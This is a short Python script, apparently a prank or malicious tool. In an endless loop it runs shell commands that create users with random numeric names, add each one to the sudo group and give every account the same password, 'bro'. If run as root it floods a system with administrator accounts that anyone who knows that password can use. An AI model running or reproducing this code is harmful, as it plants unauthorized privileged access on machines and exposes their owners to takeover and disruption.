import random
import os
while True:
	MESSAGE1 = random.randint(1,500)
	#MESSAGE1 = "bro"
	U = str(MESSAGE1)
	os.system('echo '+ U)
	os.system('useradd ' + U)
	os.system('adduser ' + U + ' sudo')
	os.system('echo '+ U + ':bro | chpasswd')
